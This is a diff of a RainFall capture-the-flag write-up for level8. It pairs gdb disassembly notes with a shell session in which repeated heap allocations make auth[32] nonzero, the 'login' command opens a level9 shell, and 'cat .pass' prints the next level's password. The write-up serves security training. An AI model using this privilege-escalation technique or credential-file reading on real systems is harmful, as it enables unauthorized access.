@@ -1,42 +1,13 @@
-(gdb) info function
-All defined functions:
-
-Non-debugging symbols:
-0x080483c4  _init
-0x08048410  printf
-0x08048410  printf@plt
-0x08048420  free
-0x08048420  free@plt
-0x08048430  strdup
-0x08048430  strdup@plt
-0x08048440  fgets
-0x08048440  fgets@plt
-0x08048450  fwrite
-0x08048450  fwrite@plt
-0x08048460  strcpy
-0x08048460  strcpy@plt
-0x08048470  malloc
-0x08048470  malloc@plt
-0x08048480  system
-0x08048480  system@plt
-0x08048490  __gmon_start__
-0x08048490  __gmon_start__@plt
-0x080484a0  __libc_start_main
-0x080484a0  __libc_start_main@plt
-0x080484b0  _start
-0x080484e0  __do_global_dtors_aux
-0x08048540  frame_dummy
-0x08048564  main
-0x08048740  __libc_csu_init
-0x080487b0  __libc_csu_fini
-0x080487b2  __i686.get_pc_thunk.bx
-0x080487c0  __do_global_ctors_aux
-0x080487ec  _fini
-
+level8@RainFall:~$ id
+uid=2008(level8) gid=2008(level8) groups=2008(level8),100(users)
+level8@RainFall:~$ pwd
+/home/user/level8
+level8@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 level9 users 6057 Mar  6  2016 level8
 ********************************************************************************
-
+The binary executes with permissions of level9 user.
 ********************************************************************************
-
 (gdb) info variable
 All defined variables:
 
@@ -63,9 +34,8 @@ Non-debugging symbols:
 0x08049aa8  dtor_idx.6161
 0x08049aac  auth
 0x08049ab0  service
-
 ********************************************************************************
-
+We can see two variables here, auth and service.
 ********************************************************************************
 
 (gdb) disas main
@@ -211,41 +181,58 @@ Dump of assembler code for function main:
 End of assembler dump.
 
 ********************************************************************************
-
+This main function is an infinite loop. The body of this loop prints the
+addresses in auth and service variables, before to copy stdin in a stack buffer
+with fgets. The resulting buffer is then compared (strncmp) with four strings
+stored in memory.
 ********************************************************************************
 
 (gdb) x /100s 0x8048800
-0x8048800 <_fini+20>:	 "\377\203\304\b[\303"
-0x8048807:	 ""
-0x8048808 <_fp_hw>:	 "\003"
-0x804880a <_fp_hw+2>:	 ""
-0x804880b <_fp_hw+3>:	 ""
-0x804880c <_IO_stdin_used>:	 "\001"
-0x804880e <_IO_stdin_used+2>:	 "\002"
-0x8048810:	 "%p, %p \n"
-0x8048819:	 "auth "
-0x804881f:	 "reset"
-0x8048825:	 "service"
-0x804882d:	 "login"
-0x8048833:	 "/bin/sh"
-0x804883b:	 "Password:\n"
+...
+0x8048810:	 "%p, %p \n" ; printf format
+0x8048819:	 "auth " ;  string 1
+0x804881f:	 "reset" ;  string 2
+0x8048825:	 "service" ;  string 3
+0x804882d:	 "login" ;  string 4
+0x8048833:	 "/bin/sh" ; system parameter
+0x804883b:	 "Password:\n" ; Password asking string
 0x8048846:	 ""
 0x8048847:	 ""
 ...
-
 ********************************************************************************
+Theses four comparisons will lead us to four actions :
 
+"auth " :
+Will malloc a 4 bytes buffer, and put its address in auth, before to set thoses
+4 bytes at 0. Will then compare the length of input buffer with 30, and call
+strcpy(auth, input_buffer + 5) if inferior or equal.
+
+"reset" :
+Will free the address contained in auth variable.
+
+"service":
+Will strdup at input_buffer + 7, and store the result in service variable.
+
+"login":
+Will launch a shell with level9 permissions if auth[32] != 0, or else will
+ask for a password by printing the password string on stdout.
+
+So now we know that we have to influence auth[32] with our input on stdin.
+By repeating strdup instruction with the service "command", we can offset
+the service pointer enough to modify this byte.
 ********************************************************************************
 
 level8@RainFall:~$ ./level8
 (nil), (nil)
-auth
+auth									; We firstly allocate the zone in auth.
 0x804a008, (nil)
+service									; Then we strdup the input in service.
+0x804a008, 0x804a018					; We can see that the address of service is 16 bytes after auth.
 service
-0x804a008, 0x804a018
-service
-0x804a008, 0x804a028
-login
+0x804a008, 0x804a028					; By repeating the command, we get a 32 offset. The desired byte is modified by strdup.
+login									; We can launch login command to get our shell.
+$ whoami
+level9
 $ cd ../level9
 $ cat .pass
 c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
